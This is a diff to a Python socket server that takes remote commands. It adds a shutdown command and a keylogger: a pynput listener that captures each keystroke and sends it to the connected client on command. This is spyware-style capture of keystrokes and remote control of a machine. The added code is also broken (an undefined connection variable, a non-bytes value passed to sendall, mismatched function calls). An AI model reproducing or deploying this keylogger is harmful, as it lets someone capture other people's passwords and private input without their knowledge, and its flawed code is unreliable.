@@ -10,8 +10,12 @@ from PyQt5.QtWidgets import QApplication
 from multiprocessing import Process
 import serverfunc
 import pickle
+from pynput.keyboard import Listener, Key
 
 all_processes = []
+
+
+
 
 
 def connectclient(tcpServer):
@@ -23,7 +27,7 @@ def connectclient(tcpServer):
         data = data.decode("utf-8")
 
         if data == "take_screenshot":
-            image_data =  serverfunc.take_screen_shot()
+            image_data = serverfunc.take_screen_shot()
             serialized_data = pickle.dumps(image_data, protocol=2)
             conn.sendall(serialized_data)
         if data == "get_process":
@@ -35,6 +39,31 @@ def connectclient(tcpServer):
             data = data.split("`")
             result = serverfunc.get_value(data[1], data[2])
             conn.send(bytes(result, "utf-8"))
+        if data == "shutdown":
+            serverfunc.shutdown_pc()
+        if data == "key_log_listening":
+            serverfunc.listening_keyboard(True)
+            pass
+        if data == "key_log_stop_listening":
+            serverfunc.listening_keyboard(False)
+            pass
+
+
+def on_press(key):
+    print('{0} pressed'.format(
+        key))
+    conn.sendall(key)
+# Collect events until released
+
+
+def listening_keyboard(listening=True):
+    if listening:
+        with Listener(
+                on_press=on_press) as listener:
+            listener.join()
+        print(listener)
+    else:
+        return False
 
 
 def runserver():
